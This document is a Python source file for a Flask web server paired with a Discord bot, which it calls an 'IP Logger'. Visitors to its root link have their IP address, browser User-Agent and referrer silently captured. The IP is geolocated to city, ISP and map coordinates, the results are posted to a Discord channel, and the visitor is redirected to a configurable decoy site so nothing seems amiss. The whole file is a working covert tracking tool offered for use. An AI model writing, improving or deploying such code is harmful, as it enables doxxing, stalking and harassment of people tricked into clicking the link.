import os
import requests
import asyncio
import threading
from datetime import datetime, timezone
from flask import Flask, request, redirect
import discord
from discord import app_commands, Embed, Color

# ─── CONFIG ────────────────────────────────────────────────
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", "0"))
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")
# ──────────────────────────────────────────────────────────

app = Flask(__name__)

# Discord bot setup (discord.py v2.x — uses Client, not Bot)
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# Global queue for passing embeds from Flask thread to Discord loop
message_queue = asyncio.Queue()

# ─── IP LOOKUP ────────────────────────────────────────────

def get_ip_info(ip):
    """Try ip-api.com (free, no key needed), fallback to ipinfo.io"""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "timezone": data.get("timezone", "Unknown"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False),
                }
    except:
        pass

    if IPINFO_TOKEN:
        try:
            r = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                loc = data.get("loc", "").split(",")
                privacy = data.get("privacy", {})
                return {
                    "ip": ip,
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "isp": data.get("org", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "lat": float(loc[0]) if len(loc) == 2 else None,
                    "lon": float(loc[1]) if len(loc) == 2 else None,
                    "timezone": data.get("timezone", "Unknown"),
                    "proxy": privacy.get("proxy", False),
                    "hosting": privacy.get("hosting", False),
                }
        except:
            pass

    return {"ip": ip, "country": "Unknown", "city": "Unknown"}

# ─── BUILD EMBED ──────────────────────────────────────────

def build_embed(ip_info, ua, referer):
    embed = Embed(
        title="📍 IP Captured",
        color=Color.red(),
        timestamp=datetime.now(timezone.utc)
    )

    embed.add_field(name="IP Address", value=f"`{ip_info['ip']}`", inline=False)

    location_parts = []
    for key in ("city", "region", "country"):
        val = ip_info.get(key)
        if val and val != "Unknown":
            location_parts.append(val)
    embed.add_field(
        name="📍 Location",
        value=", ".join(location_parts) if location_parts else "Unknown",
        inline=True
    )

    if ip_info.get("lat") and ip_info.get("lon"):
        maps = f"https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']}"
        embed.add_field(name="🗺️ Maps", value=f"[Open Maps]({maps})", inline=True)

    embed.add_field(name="🏢 ISP", value=ip_info.get("isp", "Unknown"), inline=True)
    embed.add_field(name="🏛️ Organization", value=ip_info.get("org", "Unknown"), inline=True)
    embed.add_field(name="🕐 Timezone", value=ip_info.get("timezone", "Unknown"), inline=True)

    flags = []
    if ip_info.get("proxy"):
        flags.append("🚫 Proxy/VPN")
    if ip_info.get("hosting"):
        flags.append("☁️ Datacenter")
    if ip_info.get("mobile"):
        flags.append("📱 Mobile")
    if flags:
        embed.add_field(name="⚠️ Flags", value=" | ".join(flags), inline=False)

    embed.add_field(
        name="🌐 User-Agent",
        value=f"`{ua[:100]}`" if ua else "`Unknown`",
        inline=False
    )
    if referer:
        embed.add_field(name="🔗 Referer", value=f"`{referer[:100]}`", inline=False)

    return embed

# ─── FLASK ROUTES ──────────────────────────────────────────

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "")

    ip_info = get_ip_info(ip)
    embed = build_embed(ip_info, ua, referer)

    asyncio.run_coroutine_threadsafe(
        message_queue.put(embed),
        client.loop
    )

    return redirect(REDIRECT_URL)

@app.route("/ping")
def ping():
    return "pong", 200

# ─── DISCORD EVENTS ────────────────────────────────────────

@client.event
async def on_ready():
    print(f"[+] Logged in as {client.user}")
    await tree.sync()
    channel = client.get_channel(DISCORD_CHANNEL_ID)
    if channel:
        await channel.send("🟢 **IP Logger online**")
    client.loop.create_task(process_queue())

async def process_queue():
    await client.wait_until_ready()
    channel = client.get_channel(DISCORD_CHANNEL_ID)
    if not channel:
        print(f"[!] Channel {DISCORD_CHANNEL_ID} not found")
        return
    while True:
        try:
            embed = await message_queue.get()
            await channel.send(embed=embed)
        except Exception as e:
            print(f"[!] Queue error: {e}")
        await asyncio.sleep(0.5)

# ─── SLASH COMMANDS ────────────────────────────────────────

@tree.command(name="status", description="Check bot status and queue size")
async def status(interaction: discord.Interaction):
    await interaction.response.send_message(
        embed=Embed(
            title="✅ Bot Status",
            description=f"Queue: **{message_queue.qsize()}** pending",
            color=Color.green()
        ),
        ephemeral=True
    )

@tree.command(name="setredirect", description="Change the redirect URL")
async def set_redirect(interaction: discord.Interaction, url: str):
    global REDIRECT_URL
    REDIRECT_URL = url
    await interaction.response.send_message(
        embed=Embed(
            title="✅ Redirect Updated",
            description=f"Now redirecting to:\n`{url}`",
            color=Color.green()
        ),
        ephemeral=True
    )

# ─── RUNNER ────────────────────────────────────────────────

def run_flask():
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

def run_discord():
    if not DISCORD_BOT_TOKEN:
        print("[!] DISCORD_BOT_TOKEN not set!")
        return
    client.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    run_discord()
